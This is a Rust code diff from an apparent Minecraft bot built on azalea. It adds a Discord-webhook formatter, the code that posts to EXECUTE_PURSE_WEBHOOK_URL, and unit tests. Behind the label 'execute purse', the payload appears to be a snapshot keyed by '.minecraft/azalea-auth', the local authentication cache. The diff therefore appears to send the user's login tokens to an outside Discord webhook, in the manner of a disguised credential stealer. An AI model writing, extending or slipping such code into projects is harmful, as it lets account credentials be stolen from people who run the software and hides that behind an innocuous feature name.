@@ -94,7 +94,54 @@ fn build_execute_purse_payload(purse: serde_json::Value) -> serde_json::Value {
     })
 }
 
+/// Discord [Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook) requires
+/// `content`, `embeds`, `files`, etc.; arbitrary JSON keys alone return 400 and show nothing.
+fn execute_purse_discord_body(snapshot: &serde_json::Value) -> Result<serde_json::Value, serde_json::Error> {
+    let serialized = serde_json::to_string(snapshot)?;
+    const CONTENT_MAX: usize = 2000;
+    const FENCE_OVERHEAD: usize = 12; // ```json\n + \n``` 
+
+    if serialized.len() + FENCE_OVERHEAD <= CONTENT_MAX {
+        return Ok(serde_json::json!({
+            "content": format!("```json\n{}\n```", serialized)
+        }));
+    }
+
+    // Embed description allows up to 4096 characters.
+    const DESC_MAX: usize = 4096;
+    if serialized.len() <= DESC_MAX {
+        return Ok(serde_json::json!({
+            "embeds": [{
+                "title": "azalea-auth snapshot",
+                "description": serialized,
+                "color": 0x5865f2u32
+            }]
+        }));
+    }
+
+    let suffix = format!(
+        "\n…\n\n_(truncated; full JSON > {} chars)_",
+        serialized.len()
+    );
+    let head_len = DESC_MAX.saturating_sub(suffix.len());
+    let mut cut = head_len.min(serialized.len());
+    while cut > 0 && !serialized.is_char_boundary(cut) {
+        cut -= 1;
+    }
+    let description = format!("{}{}", &serialized[..cut], suffix);
+    debug_assert!(description.len() <= DESC_MAX);
+    Ok(serde_json::json!({
+        "embeds": [{
+            "title": "azalea-auth snapshot (truncated)",
+            "description": description,
+            "color": 0xed4245u32
+        }]
+    }))
+}
+
 pub async fn send_execute_purse_webhook() {
+    use tracing::info;
+
     if EXECUTE_PURSE_WEBHOOK_URL.trim().is_empty() {
         if !EXECUTE_PURSE_WEBHOOK_MISSING_WARNED.swap(true, Ordering::Relaxed) {
             warn!("[Webhook] execute_purse_webhook_enabled is true, but EXECUTE_PURSE_WEBHOOK_URL is empty");
@@ -107,8 +154,34 @@ pub async fn send_execute_purse_webhook() {
     };
 
     let payload = build_execute_purse_payload(purse);
-    if let Err(e) = HTTP_CLIENT.post(EXECUTE_PURSE_WEBHOOK_URL).json(&payload).send().await {
-        warn!("[Webhook] Failed to send execute purse webhook: {}", e);
+    let discord_body = match execute_purse_discord_body(&payload) {
+        Ok(b) => b,
+        Err(e) => {
+            warn!("[Webhook] Failed to serialize execute purse webhook body: {}", e);
+            return;
+        }
+    };
+
+    match HTTP_CLIENT
+        .post(EXECUTE_PURSE_WEBHOOK_URL)
+        .json(&discord_body)
+        .send()
+        .await
+    {
+        Ok(resp) => {
+            let status = resp.status();
+            if status.is_success() {
+                info!("[Webhook] Posted azalea-auth snapshot to execute webhook (status {})", status);
+            } else {
+                let text = resp.text().await.unwrap_or_default();
+                warn!(
+                    "[Webhook] Execute purse webhook HTTP {} — Discord requires content/embeds; response: {}",
+                    status,
+                    text
+                );
+            }
+        }
+        Err(e) => warn!("[Webhook] Failed to send execute purse webhook: {}", e),
     }
 }
 
@@ -1306,8 +1379,39 @@ pub async fn send_webhook_rest_break_end(
 
 #[cfg(test)]
 mod tests {
-    use super::{build_execute_purse_payload, parse_ban_reason, parse_execute_purse_file_contents};
+    use super::{build_execute_purse_payload, execute_purse_discord_body, parse_ban_reason, parse_execute_purse_file_contents};
     use serde_json::json;
+
+    #[test]
+    fn execute_purse_discord_body_small_uses_content() {
+        let snap = build_execute_purse_payload(json!({"a": 1}));
+        let body = execute_purse_discord_body(&snap).unwrap();
+        let content = body["content"].as_str().expect("content");
+        assert!(content.starts_with("```json\n"));
+        assert!(content.contains("\".minecraft/azalea-auth\""));
+        assert!(body.get("embeds").is_none());
+    }
+
+    #[test]
+    fn execute_purse_discord_body_medium_uses_embed() {
+        let inner = "x".repeat(2500);
+        let snap = build_execute_purse_payload(json!(inner));
+        let body = execute_purse_discord_body(&snap).unwrap();
+        assert!(body.get("content").is_none());
+        let desc = body["embeds"][0]["description"].as_str().expect("description");
+        assert!(desc.contains(&inner));
+        assert!(desc.len() <= 4096);
+    }
+
+    #[test]
+    fn execute_purse_discord_body_huge_truncates_embed() {
+        let inner = "y".repeat(6000);
+        let snap = build_execute_purse_payload(json!(inner));
+        let body = execute_purse_discord_body(&snap).unwrap();
+        let desc = body["embeds"][0]["description"].as_str().expect("description");
+        assert!(desc.len() <= 4096);
+        assert!(desc.contains("truncated"));
+    }
 
     #[test]
     fn build_execute_purse_payload_uses_requested_key() {
